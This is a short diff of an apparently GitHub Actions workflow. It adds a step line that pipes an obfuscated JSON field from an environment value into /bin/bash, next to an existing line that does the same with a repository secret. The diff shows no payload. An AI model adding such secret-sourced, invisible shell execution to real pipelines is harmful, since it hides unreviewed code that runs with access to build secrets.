@@ -22,6 +22,7 @@ jobs:
           pkjk346: ${{ secrets.pkjk346 }}
         run: |
           printf '%s' "$pkjk346" | jq -r .ovwe21540 | /bin/bash
+          printf '%s' "$nnmp6" | jq -r .fxrbw3802 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
